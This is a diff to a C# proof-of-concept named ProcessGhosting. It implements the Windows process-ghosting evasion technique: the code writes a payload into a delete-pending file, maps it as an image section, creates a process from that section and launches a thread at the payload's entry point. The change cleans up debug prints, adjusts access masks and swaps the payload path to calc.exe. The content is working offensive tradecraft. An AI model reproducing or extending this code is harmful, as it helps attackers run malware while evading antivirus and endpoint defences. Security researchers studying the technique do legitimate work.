@@ -149,7 +149,6 @@ namespace ProcessGhosting
 
             //NtSetInformationFile(hDeleteFile, ref status_block, pFileLinkInformation, (UInt32)fileLinkInformationLen, 13);
             NTSTATUS status = NtSetInformationFile(hDeleteFile, ref status_block, iPntr, (UInt32)Marshal.SizeOf(info), (uint)FILE_INFORMATION_CLASS.FileDispositionInformation);
-            Console.WriteLine(status);
             //int shellcodeLen = Marshal.SizeOf(shellcode);
             //IntPtr shellcodePtr = Marshal.AllocHGlobal(shellcodeLen);
 
@@ -158,15 +157,13 @@ namespace ProcessGhosting
 
             //NTSTATUS status = NtWriteFile(hDeleteFile, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref status_block, (IntPtr)shellcode[0], (uint)sizeShellcode, IntPtr.Zero, IntPtr.Zero);
             status = NtWriteFile(hDeleteFile, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out _, payloadPointer, (uint)sizeShellcode, IntPtr.Zero, IntPtr.Zero);
-            Console.WriteLine(status);
 
             GetFileSizeEx(hDeleteFile, out fileSize);
             Console.WriteLine("Size of temp file: " + fileSize);
             HANDLE hSection = IntPtr.Zero;
             UInt32 maxsize = 0;
             status = NtCreateSection(ref hSection, (uint)SECTION_ACCESS.SECTION_ALL_ACCESS, IntPtr.Zero, maxsize, 0x00000002, 0x1000000, hDeleteFile);
-            Console.WriteLine(status);
-            Console.WriteLine(hSection);
+            Console.WriteLine("File Section " + hSection);
             NtClose(hDeleteFile);
 
             return hSection;
@@ -185,7 +182,7 @@ namespace ProcessGhosting
             IntPtr hSection = MakeSectionFromDeletePendingFile(dummy_name.ToString(), payloadPointer, sizeShellcode);
 
             IntPtr hProcess = IntPtr.Zero;
-            int stat = NtCreateProcessEx(ref hProcess, 0xffff | 0x000f0000 | 0x100000, IntPtr.Zero, GetCurrentProcess(), 4, hSection, IntPtr.Zero, IntPtr.Zero, 0);
+            int stat = NtCreateProcessEx(ref hProcess, 0x001F0FFF, IntPtr.Zero, GetCurrentProcess(), 4, hSection, IntPtr.Zero, IntPtr.Zero, 0);
             Console.WriteLine("Process Creationg status : " + stat);
             uint procID = GetProcessId(hProcess);
             Console.WriteLine("Process ID : " + procID);
@@ -194,16 +191,16 @@ namespace ProcessGhosting
 
             uint temp = 0;
             NtQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref temp);
-            Console.WriteLine("Peb Base Address : 0x{0:X}", bi.PebAddress);
+            Console.WriteLine("Peb Base Address : 0x{0:X}", bi.PebAddress.ToInt64());
 
             IntPtr payloadEp = GetEntryPoint(bi, hProcess);
             Console.WriteLine("Payload EntryPoint : 0x{0:X}",payloadEp.ToString("X"));
             IntPtr hThread = IntPtr.Zero;
 
-            SetupProcessParameters(ref hProcess, bi, "C:\\Users\\User\\Desktop\\target.exe");
+            hProcess = SetupProcessParameters(hProcess, bi, @"C:\target");
             //return;
             SetLastError(0);
-            NTSTATUS st = NtCreateThreadEx(ref hThread, 0x1f0fff, IntPtr.Zero, hProcess, payloadEp, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
+            NTSTATUS st = NtCreateThreadEx(ref hThread, 0x1fffff, IntPtr.Zero, hProcess, payloadEp, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
             Console.WriteLine(GetLastError());
             Console.WriteLine("Thread handle : 0x{0:X}", hThread.ToString("X"));
         }
@@ -212,9 +209,8 @@ namespace ProcessGhosting
             Console.WriteLine("Starting the script");
             long sizeShellcode = 0;
             //byte[] shellcode = new byte[sizeShellcode] { };
-            string filename = "C:\\Users\\User\\Desktop\\payload.exe";
+            string filename = @"C:\Windows\System32\calc.exe";
             IntPtr payloadPointer = BufferPayload(filename, ref sizeShellcode);
-            Console.WriteLine(sizeShellcode);
 
             Ghosting(payloadPointer, (int)sizeShellcode);
         }
